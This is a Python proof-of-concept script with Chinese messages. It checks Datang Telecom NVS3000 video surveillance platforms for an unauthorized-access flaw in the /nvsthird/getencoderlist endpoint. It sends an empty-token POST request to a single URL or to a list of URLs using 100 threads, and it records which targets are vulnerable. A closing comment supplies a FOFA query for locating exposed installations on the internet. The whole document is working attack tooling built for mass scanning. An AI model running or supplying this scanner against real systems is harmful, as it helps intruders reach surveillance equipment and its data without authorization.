import argparse,requests,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """大唐电信NVS3000综合视频监控平台getencoderlist存在未授权访问漏洞"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='大唐电信NVS3000综合视频监控平台getencoderlist存在未授权访问漏洞')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/nvsthird/getencoderlist"
    headers = {
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip,deflate",
        "Accept": "application/json,text/javascript,*/*;q=0.01",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "User-Agent": "Mozilla/5.0(Macintosh;IntelMacOSX10_15_7)AppleWebKit/537.36(KHTML,likeGecko)Chrome/125.0.0.0Safari/537.36",
        "Content-Length": "49",

    }
    data = '{"token":"","fromindex":0,"toindex":-1}'
    try:
        response = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        if response.status_code == 200 and "OK" in response.text:
            print(f"[+]{target}存在未授权访问漏洞")
            with open('大唐未授权_result.txt','a',encoding='utf-8') as f:
                f.write(f"{target}存在未授权访问漏洞\n")
        else:
            print(f"[-]{target}不存在未授权访问漏洞")
    except:
        print(f"[x]{target}可能存在未授权访问漏洞请手工测试")
if __name__ == '__main__':
    main()

#fofa
# (body="NVS3000综合视频监控平台" && title=="综合视频监控平台") || app="大唐电信-NVS3000"